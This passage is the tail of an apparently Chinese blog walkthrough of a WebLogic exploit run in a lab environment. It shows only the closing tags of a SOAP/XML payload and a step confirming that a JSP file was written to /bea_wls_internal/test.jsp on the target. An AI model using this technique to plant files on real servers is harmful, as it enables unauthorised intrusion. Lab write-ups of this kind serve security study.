     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
     &lt;/work:WorkContext&gt;
     &lt;/soapenv:Header&gt;
     &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre> 
<p> <img alt="" height="300" src="https://images2.imgbox.com/f3/da/XcciwGV3_o.png" width="553"></p> 
<p>8. 访问靶场ip: 7001//bea_wls_internal/test.jsp,写入成功</p> 
<p><img alt="" height="275" src="https://images2.imgbox.com/bd/6d/GtaA7Y43_o.png" width="544"></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<hr> 
<h2 id="%E6%80%BB%E7%BB%93"><a id="_45"></a>总结</h2> 
<p>持续更新中...</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2332d9bcc74d79dffb3dd57274b84361/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">A&#43;B Problem C&#43;&#43;</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/58d7f87a991fd42d195f132eeb0bc912/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【深度学习】(5) ShuffleNetV2 代码复现，网络解析，附pytorch完整代码</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>